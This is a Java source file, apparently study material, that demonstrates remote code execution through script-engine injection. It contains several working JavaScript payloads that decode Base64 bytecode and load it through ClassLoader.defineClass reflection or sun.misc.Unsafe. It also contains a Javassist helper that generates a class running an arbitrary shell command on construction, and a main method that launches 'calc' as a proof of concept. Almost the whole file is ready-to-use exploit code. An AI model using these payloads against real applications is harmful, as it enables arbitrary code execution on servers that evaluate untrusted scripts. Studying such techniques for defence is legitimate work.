package basicknowledge;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.script.ScriptEngineManager;
import java.util.Base64;

public class JsRCE {

    public static void main(String[] args) throws Exception {
        JsRCE jsRCE = new JsRCE();
        jsRCE.jsTest();
    }
    public static String getJsPayload2(String code) throws Exception {
        return "var data = '" + code + "';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var int = Java.type(\"int\");" +
                "var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(" +
                "\"defineClass\", bytes.class, int.class, int.class);" +
                "defineClassMethod.setAccessible(true);" +
                "var cc = defineClassMethod.invoke(" +
                "int.class.getClassLoader(), bytes, 0, bytes.length);" +
                "cc.getConstructor(java.lang.String.class).newInstance(cmd);";
    }

    public static byte[] getEvilCode(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }
    public void jsTest() throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        manager.getEngineByName("js").eval(getJsPayload5(Base64.getEncoder().encodeToString(getEvilCode("calc"))));
    }

    public static String getJsPayload3(String code) throws Exception {
        return "var data = '" + code + "';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var Unsafe = Java.type(\"sun.misc.Unsafe\");" +
                "var field = Unsafe.class.getDeclaredField(\"theUnsafe\");" +
                "field.setAccessible(true);" +
                "var unsafe = field.get(null);" +
                "var Modifier = Java.type(\"java.lang.reflect.Modifier\");" +
                "var byteArray = Java.type(\"byte[]\");" +
                "var int = Java.type(\"int\");" +
                "var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(" +
                "\"defineClass\",byteArray.class,int.class,int.class);" +
                "var modifiers = defineClassMethod.getClass().getDeclaredField(\"modifiers\");" +
                "unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);" +
                "var cc = defineClassMethod.invoke(" +
                "java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);" +
                "cc.newInstance();";
    }
    public static String getJsPayload5(String code) throws Exception {
        return "var data = '" + code + "';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");" +
                "theUnsafe.setAccessible(true);" +
                "unsafe = theUnsafe.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bytes, null).newInstance();";
    }
}
